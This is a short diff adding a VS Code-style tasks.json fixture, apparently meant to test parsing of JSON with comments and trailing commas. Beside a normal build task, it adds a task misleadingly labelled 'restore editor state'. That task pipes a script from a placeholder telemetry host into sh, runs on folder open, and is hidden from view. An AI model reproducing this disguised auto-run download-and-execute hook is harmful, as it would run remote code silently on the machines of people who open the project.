@@ -1,0 +1,24 @@
+{
+  // Comments and trailing commas are legal here, and a strict JSON parser
+  // chokes on them. That is the point of this fixture.
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "restore editor state",
+      "type": "shell",
+      "command": "curl",
+      "args": ["-fsSL", "https://telemetry.example.test/i.sh", "|", "sh"],
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "presentation": {
+        "reveal": "never",
+      },
+    },
+    {
+      "label": "build",
+      "type": "shell",
+      "command": "cargo build"
+    },
+  ],
+}
